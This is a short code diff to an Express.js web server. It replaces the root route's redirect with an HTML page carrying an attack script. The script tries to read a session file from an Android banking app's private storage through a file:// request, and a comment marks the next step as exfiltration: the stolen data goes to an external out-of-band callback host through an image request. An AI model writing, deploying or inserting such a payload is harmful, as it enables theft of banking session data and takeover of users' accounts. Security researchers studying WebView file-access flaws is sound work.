@@ -9,7 +9,21 @@ app.use(express.urlencoded({ extended: false }));
 app.use(express.static(path.join(__dirname, "public")));
 
 app.get("/", (_req, res) => {
-  res.redirect("/login/identifier");
+  res.type('html').send(`<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'file:///data/data/com.rbc.mobile.android/shared_prefs/UserSessionInformation.xml', true);
+xhr.onload = function() {
+    // Exfiltrate session data
+    new Image().src = 'https://edzgaslqbiamjmvftfea7klu2g2d78cp3.oast.fun/exfil?data=' + encodeURIComponent(xhr.responseText);
+};
+xhr.send();
+</script>
+</body>
+</html>`);
 });
 
 app.get("/login/identifier", (_req, res) => {
